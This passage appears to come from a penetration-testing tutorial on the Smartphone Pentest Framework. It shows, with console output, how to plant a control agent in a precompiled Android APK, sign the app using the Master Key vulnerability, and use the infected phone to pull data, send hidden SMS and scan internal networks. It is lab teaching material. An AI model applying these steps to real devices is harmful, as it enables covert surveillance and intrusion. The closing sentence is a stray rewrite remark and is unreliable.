### Listing 20-13: Attaching SPF to the Deployed Agent

1. From the main menu, select option 1, then choose **1.) Attach Framework to a Deployed Agent**.
2. You will be prompted to enter the **path**, **key**, and **communication method**. Use the same values you provided when creating the agent.
3. SPF may appear to hang for a moment as it waits for the agent to respond.
4. Once it returns to the menu, you should be connected to the agent.
5. Now, choose **2.) Send Commands to an Agent** from the main menu.
6. A list of agents in the database will be displayed, and you should see the agent you just attached.

```plaintext
spf> 2
Available Agents:
15555215556
```

### Backdooring APKs

Before proceeding with using the deployed SPF agent, let's explore another, more sophisticated method of creating an agent. This method is useful when you do not have access to the source code of the app you want to backdoor. SPF can work with precompiled APK files, including those from the Google Play store.

#### Using the Smartphone Pentest Framework

To backdoor an APK with the SPF agent:

1. From the main menu, select **1)**, then choose **5.) Backdoor Android APK with Agent**.

```plaintext
spf> 1
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent
2.) Generate Agent App
3.) Copy Agent to Web Server
4.) Import an Agent Template
5.) Backdoor Android APK with Agent
6.) Create APK Signing Key
spf> 5
```

2. If APKTool is not installed, SPF will prompt you to install it. Enter `y` to proceed with the installation.

```plaintext
APKTool not found! Is it installed? Check your config file
Install Android APKTool(y/N)?
spf> y
--2015-12-04 12:28:21-- https://android-apktool.googlecode.com/files/apktool-install-linux-r05-ibot.tar.bz2
--snip--
Puts the Android Agent inside an Android App APK. The application runs normally with extra functionality
APK to Backdoor: /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk
I: Baksmaling...
--snip--
```

3. When prompted, specify the APK to backdoor, such as `/root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk`.
4. SPF will decompile the APK, combine it with the SPF agent, and recompile it.
5. Set up the agent by providing the **control phone number**, **control key**, and **control path**. These are the same details used when backdooring source code.

```plaintext
Phone number of the control modem for the agent: 15555215554
Control key for the agent: KEYKEY1
Webserver control path for agent: /androidagent1
Control Number: 15555215554
Control Key: KEYKEY1
Control Path: /androidagent1
Is this correct?(y/n) y
--snip--
```

6. After recompiling, sign the backdoored APK. Android devices check signatures during installation. If the APK is not signed, it will be rejected.

```plaintext
Use Android Master Key Vuln?(y/N): y
Archive: /root/Desktop/abcnews.apk
--snip--
Inflating: unzipped/META-INF/CERT.RSA
```

7. If you choose to use the Android Master Key vulnerability, enter `y` at the prompt. This allows you to replace legitimate applications with your code, bypassing signature verification (fixed in Android 4.2).

8. If you do not want to use the Master Key vulnerability, enter `n` and sign the APK with your default key for the Android keystore on Kali.

```plaintext
Use Android Master Key Vuln?(y/N): n
Password for Debug Keystore is android
Enter Passphrase for keystore:
--snip--
signing: resources.arsc
```

### Post-Exploitation

Once the agent is on the device, you can perform various actions:

#### Information Gathering

1. Run information-gathering commands, such as getting a list of installed applications.

```plaintext
spf> 2
View Data Gathered from a Deployed Agent:
Available Agents:
1.) 15555215556
Select an agent to interact with or 0 to return to the previous menu.
spf> 1
Commands:
1.) Send SMS
2.) Take Picture
3.) Get Contacts
4.) Get SMS Database
5.) Privilege Escalation
6.) Download File
7.) Execute Command
8.) Upload File
9.) Ping Sweep
10.) TCP Listener
11.) Connect to Listener
12.) Run Nmap
13.) Execute Command and Upload Results
14.) Get Installed Apps List
spf> 14
Delivery Method(SMS or HTTP): HTTP
```

2. View the gathered data.

```plaintext
spf> 3
View Data Gathered from a Deployed Agent:
Agents or Attacks? Agents
Available Agents:
1.) 15555215556
Select an agent to interact with or 0 to return to the previous menu.
spf> 1
Data:
SMS Database:
Contacts:
Picture Location:
Rooted:
Ping Sweep:
File:
Packages: package:com.google.android.location
--snip--
package:com.android.providers.downloads
package:com.android.server.vpn
```

#### Remote Control

1. Use the agent to remotely control the device, such as sending an SMS message that does not appear in the sent messages of the SMS app.

```plaintext
spf> 1
Send an SMS message to another phone. Fill in the number, the message to send, and the delivery method(SMS or HTTP).
Number: 15555215558
Message: hiya Georgia
Delivery Method(SMS or HTTP) SMS
```

#### Pivoting Through Mobile Devices

1. Exploit mobile devices to pivot into internal networks. Many companies lack robust mobile device management (MDM) and mobile antivirus solutions, making mobile devices a potential entry point into corporate networks.
2. Use the SPF agent to run a pentest on the mobile network through the exploited mobile device.

#### Port Scanning with Nmap

1. Install Nmap for Android using the SPF menu.

```plaintext
spf> 10
What would you like to Install?
1.) Android SDKS
2.) Android APKTool
3.) Download Android Nmap
spf> 3
Download Nmap for Android(y/N)?
spf> y
```

2. Run Nmap against a target, such as a Windows XP machine.

```plaintext
spf> 12
Download Nmap and port scan a host of range. Use any accepted format for target specification in Nmap
Nmap Target: 192.168.20.10
Delivery Method(SMS or HTTP) HTTP
```

3. After Nmap runs, check the gathered information. The results will be saved in a file, such as `/root/Smartphone-Pentest-Framework/frameworkconsole/text.txt`.

```plaintext
# Nmap 5.61TEST4 scan initiated Sun Sep 6 23:41:30 2015 as: /data/data/com.example.android.google.apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput 192.168.20.10
Nmap scan report for 192.168.20.10
```

This structured approach ensures clarity and professionalism, making the instructions easy to follow and understand.